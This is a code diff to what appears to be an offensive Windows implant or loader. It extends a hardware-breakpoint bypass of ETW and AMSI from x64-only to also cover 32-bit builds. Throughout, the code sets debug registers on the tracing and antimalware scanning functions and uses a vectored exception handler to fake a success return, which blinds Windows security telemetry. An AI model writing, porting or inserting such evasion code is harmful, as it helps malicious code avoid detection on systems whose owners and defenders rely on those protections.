@@ -25,9 +25,15 @@ static auto WINAPI declfn veh_hw_bp_handler(
 
     // Check if the fault address matches DR0 (ETW) or DR1 (AMSI)
     if ( addr == ctx->Dr0 || addr == ctx->Dr1 ) {
-        ctx->Rax = 0;   // STATUS_SUCCESS / S_OK
+#ifdef _WIN64
+        ctx->Rax = 0;
         ctx->Rip = *reinterpret_cast<uintptr_t*>( ctx->Rsp );
-        ctx->Rsp += 8;  // pop return address
+        ctx->Rsp += 8;
+#else
+        ctx->Eax = 0;
+        ctx->Eip = *reinterpret_cast<uintptr_t*>( ctx->Esp );
+        ctx->Esp += 4;
+#endif
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
@@ -92,9 +98,12 @@ static auto declfn set_hw_breakpoint(
     if ( pNtGetCtx( hThread, &ctx ) != 0 )
         return false;
 
+#ifdef _WIN64
     auto addr = reinterpret_cast<DWORD64>( target_addr );
+#else
+    auto addr = reinterpret_cast<DWORD>( target_addr );
+#endif
 
-    // Set the appropriate debug register
     switch ( dr_index ) {
         case 0: ctx.Dr0 = addr; break;
         case 1: ctx.Dr1 = addr; break;
@@ -103,11 +112,7 @@ static auto declfn set_hw_breakpoint(
         default: return false;
     }
 
-    // DR7: enable local breakpoint for the chosen DR index
-    // Bits 0,2,4,6 = local enable for DR0,DR1,DR2,DR3
-    // Condition bits (16-17, 20-21, 24-25, 28-29) = 00 = break on execution
-    // Length bits   (18-19, 22-23, 26-27, 30-31) = 00 = 1-byte (exec)
-    ctx.Dr7 |= ( 1ULL << ( dr_index * 2 ) );
+    ctx.Dr7 |= ( static_cast<decltype(ctx.Dr7)>(1) << ( dr_index * 2 ) );
 
     if ( pNtSetCtx( hThread, &ctx ) != 0 )
         return false;
